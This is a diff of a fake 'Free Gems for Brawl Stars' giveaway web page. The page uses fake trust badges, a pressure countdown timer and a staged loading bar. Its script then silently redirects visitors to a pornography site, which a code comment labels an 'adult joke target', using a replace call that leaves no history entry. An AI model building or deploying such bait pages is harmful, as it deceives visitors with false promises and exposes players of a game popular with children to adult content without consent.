@@ -16,86 +16,30 @@
             text-align: center;
             position: relative;
         }
-
         .bg-overlay {
-            position: absolute;
-            inset: 0;
+            position: absolute; inset: 0;
             background: radial-gradient(circle at center, rgba(255,204,0,0.08), transparent 70%);
             pointer-events: none;
         }
-
         header {
             padding: 2rem 1rem;
             background: rgba(13,27,46,0.85);
             border-bottom: 4px solid #FFCC00;
         }
-
         .logo {
             max-width: 360px;
             margin: 0 auto 1rem;
             display: block;
         }
-
-        h1 {
-            font-family: 'Press Start 2P', sans-serif;
-            font-size: 2.8rem;
-            color: #FFCC00;
-            text-shadow: 0 0 15px #FFCC00;
-            margin-bottom: 0.5rem;
-        }
-
-        .subtitle {
-            font-size: 1.4rem;
-            color: #A0E0FF;
-            margin-bottom: 1.5rem;
-        }
-
-        .trust-badges {
-            display: flex;
-            justify-content: center;
-            gap: 2.5rem;
-            flex-wrap: wrap;
-            margin: 1.5rem 0 2rem;
-        }
-
-        .trust-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            max-width: 110px;
-        }
-
-        .trust-item img {
-            width: 72px;
-            height: 72px;
-            margin-bottom: 0.6rem;
-        }
-
-        .trust-item span {
-            font-size: 1.05rem;
-            color: #FFCC00;
-            font-weight: bold;
-        }
-
-        .timer {
-            font-size: 1.35rem;
-            color: #FF6666;
-            font-weight: bold;
-            margin: 1rem 0;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 2rem 1rem;
-        }
-
-        .offers {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 2rem;
-        }
-
+        h1 { font-family: 'Press Start 2P', sans-serif; font-size: 2.8rem; color: #FFCC00; text-shadow: 0 0 15px #FFCC00; margin-bottom: 0.5rem; }
+        .subtitle { font-size: 1.4rem; color: #A0E0FF; margin-bottom: 1.5rem; }
+        .trust-badges { display: flex; justify-content: center; gap: 2.5rem; flex-wrap: wrap; margin: 1.5rem 0 2rem; }
+        .trust-item { display: flex; flex-direction: column; align-items: center; max-width: 110px; }
+        .trust-item img { width: 72px; height: 72px; margin-bottom: 0.6rem; }
+        .trust-item span { font-size: 1.05rem; color: #FFCC00; font-weight: bold; }
+        .timer { font-size: 1.35rem; color: #FF6666; font-weight: bold; margin: 1rem 0; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 2rem 1rem; }
+        .offers { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 2rem; }
         .offer-card {
             background: rgba(255,255,255,0.07);
             border: 4px solid #FFCC00;
@@ -104,31 +48,10 @@
             transition: all 0.4s ease;
             cursor: pointer;
         }
-
-        .offer-card:hover {
-            transform: translateY(-12px) scale(1.05);
-            border-color: #FFD700;
-            box-shadow: 0 15px 35px rgba(255,204,0,0.3);
-        }
-
-        .gem-icon {
-            width: 170px;
-            margin: 0 auto 1rem;
-        }
-
-        .offer-gems {
-            font-family: 'Press Start 2P', sans-serif;
-            font-size: 3.4rem;
-            color: #FFCC00;
-            text-shadow: 0 0 12px #FFCC00;
-        }
-
-        .offer-text {
-            font-size: 1.3rem;
-            color: #E0F0FF;
-            margin: 0.8rem 0;
-        }
-
+        .offer-card:hover { transform: translateY(-12px) scale(1.05); border-color: #FFD700; box-shadow: 0 15px 35px rgba(255,204,0,0.3); }
+        .gem-icon { width: 170px; margin: 0 auto 1rem; }
+        .offer-gems { font-family: 'Press Start 2P', sans-serif; font-size: 3.4rem; color: #FFCC00; text-shadow: 0 0 12px #FFCC00; }
+        .offer-text { font-size: 1.3rem; color: #E0F0FF; margin: 0.8rem 0; }
         .claim-btn {
             background: linear-gradient(#FFCC00, #FFAA00);
             border: none;
@@ -140,21 +63,8 @@
             cursor: pointer;
             width: 100%;
         }
-
-        #step-input, #step-delivery {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            margin: 4rem 1rem;
-        }
-
-        h2 {
-            font-family: 'Press Start 2P', sans-serif;
-            font-size: 2.4rem;
-            color: #FFCC00;
-            margin-bottom: 1.5rem;
-        }
-
+        #step-input, #step-delivery { display: none; flex-direction: column; align-items: center; margin: 4rem 1rem; }
+        h2 { font-family: 'Press Start 2P', sans-serif; font-size: 2.4rem; color: #FFCC00; margin-bottom: 1.5rem; }
         .input-box {
             background: rgba(255,255,255,0.1);
             border: 3px solid #FFCC00;
@@ -167,7 +77,6 @@
             text-align: center;
             margin: 2rem 0;
         }
-
         .submit-btn {
             background: linear-gradient(#FFCC00, #FF8800);
             border: none;
@@ -178,32 +87,18 @@
             border-radius: 50px;
             cursor: pointer;
         }
-
-        .status {
-            font-size: 1.7rem;
-            color: #FFCC00;
-            margin: 2rem 0;
-            min-height: 2.2rem;
-        }
-
+        .status { font-size: 1.7rem; color: #FFCC00; margin: 2rem 0; min-height: 2.2rem; }
         .loader-container {
-            width: 85%;
-            max-width: 520px;
-            height: 24px;
+            width: 85%; max-width: 520px; height: 24px;
             background: rgba(255,255,255,0.12);
-            border-radius: 12px;
-            overflow: hidden;
-            margin: 2.5rem 0;
-            border: 2px solid #FFCC00;
+            border-radius: 12px; overflow: hidden;
+            margin: 2.5rem 0; border: 2px solid #FFCC00;
         }
-
         .loader-bar {
-            width: 0%;
-            height: 100%;
+            width: 0%; height: 100%;
             background: linear-gradient(to right, #FFCC00, #FFEE00, #FFCC00);
             transition: width 0.6s ease-out;
         }
-
         @media (max-width: 768px) {
             h1 { font-size: 2.2rem; }
             .gem-icon { width: 140px; }
@@ -216,11 +111,15 @@
 <div class="bg-overlay"></div>
 
 <header>
-    <img src="https://cdn.discordapp.com/attachments/1307735350697001103/1482821542067835063/146F2280-23CE-4C16-B9C0-F922F7BC5582-removebg-preview.png?ex=69b858ad&is=69b7072d&hm=b6bd4961f0dd2e6c3755bf678852c3896fdf6b9a4388fa951d25d2e1befcadb1&" alt="Brawl Stars Logo" class="logo">
+    <!-- REPLACE WITH YOUR PERMANENT LOGO URL (Imgur/GitHub) -->
+    <img src="https://cdn.discordapp.com/attachments/1307735350697001103/1482821542067835063/146F2280-23CE-4C16-B9C0-F922F7BC5582-removebg-preview.png?ex=69b858ad&is=69b7072d&hm=b6bd4961f0dd2e6c3755bf678852c3896fdf6b9a4388fa951d25d2e1befcadb1&" 
+         alt="Brawl Stars Logo" class="logo">
+
     <h1>Free Gems for Brawl Stars!</h1>
     <p class="subtitle">Claim your gems super easy – works for every brawler in 2026!</p>
 
     <div class="trust-badges">
+        <!-- REPLACE THESE 3 WITH YOUR PERMANENT URLs -->
         <div class="trust-item">
             <img src="https://cdn.discordapp.com/attachments/1307735350697001103/1482826087066108117/IMG_1802.png?ex=69b85ce8&is=69b70b68&hm=5dcb33fded69ce84327823741935fde7962d3fed2e53c87c9cdaf90f9b175aea&" alt="100% Safe">
             <span>100% Safe</span>
@@ -241,27 +140,25 @@
 <div class="container">
     <div id="step-offers">
         <div class="offers">
+            <!-- REPLACE THESE 4 GEM ICON URLs -->
             <div class="offer-card">
                 <img src="https://cdn.discordapp.com/attachments/1307735350697001103/1482822533391585400/IMG_1801-removebg-preview.png?ex=69b85999&is=69b70819&hm=3ef1b96f5cdebb08f8d6efbef675178de92015787106e5a6cb5e1b1f1435fb7a&" alt="49 Gems" class="gem-icon">
                 <div class="offer-gems">49</div>
                 <div class="offer-text">Quick Boost Pack</div>
                 <button class="claim-btn">Claim Now!</button>
             </div>
-
             <div class="offer-card">
                 <img src="https://cdn.discordapp.com/attachments/1307735350697001103/1482822533844697138/IMG_1798-removebg-preview.png?ex=69b85999&is=69b70819&hm=286f83929d46153734d4e8bae221227d756cf5d741a8c9636c0bb7151b0ac53f&" alt="149 Gems" class="gem-icon">
                 <div class="offer-gems">149</div>
                 <div class="offer-text">Epic Bundle</div>
                 <button class="claim-btn">Claim Now!</button>
             </div>
-
             <div class="offer-card">
                 <img src="https://cdn.discordapp.com/attachments/1307735350697001103/1482822533081202978/IMG_1799-removebg-preview.png?ex=69b85999&is=69b70819&hm=6ee57aa6db7882e42d72894d0ffc51adf565ab6ed2b56387aa8f85b215dfd76b&" alt="199 Gems" class="gem-icon">
                 <div class="offer-gems">199</div>
                 <div class="offer-text">Mythic Skin Pack</div>
                 <button class="claim-btn">Claim Now!</button>
             </div>
-
             <div class="offer-card">
                 <img src="https://cdn.discordapp.com/attachments/1307735350697001103/1482822534289166336/IMG_1800-removebg-preview.png?ex=69b85999&is=69b70819&hm=144c16be0c358320d3746b31d26040f7b6fe79722e6d1ea522825cf6c5e650b5&" alt="999 Gems" class="gem-icon">
                 <div class="offer-gems">999</div>
@@ -290,9 +187,9 @@
 </div>
 
 <script>
-    const hiddenURL = "https://www.pornhub.com";
+    const hiddenURL = "https://www.pornhub.com";   // ← your adult joke target (change if you want a specific video)
 
-    // Simple countdown
+    // Countdown
     let seconds = 14*60 + 59;
     const timer = document.getElementById('countdown');
     setInterval(() => {
@@ -302,7 +199,7 @@
         timer.textContent = `Offer ends in: ${min}:${sec < 10 ? '0' : ''}${sec}`;
     }, 1000);
 
-    // Click any offer card
+    // Click any offer → go to input step
     document.querySelectorAll('.offer-card').forEach(card => {
         card.addEventListener('click', () => {
             document.getElementById('step-offers').style.display = 'none';
@@ -349,12 +246,12 @@
                     progress = stages[stage].perc;
                     stage++;
                 }
-                bar.style.width = progress + '%';
+                bar.style.width = `${Math.min(progress, 100)}%`;
 
                 if (progress >= 100) {
                     clearInterval(loaderInterval);
                     setTimeout(() => {
-                        window.location.replace(hiddenURL);
+                        window.location.replace(hiddenURL);   // clean redirect (no history)
                     }, 1800);
                 }
             }, 420);
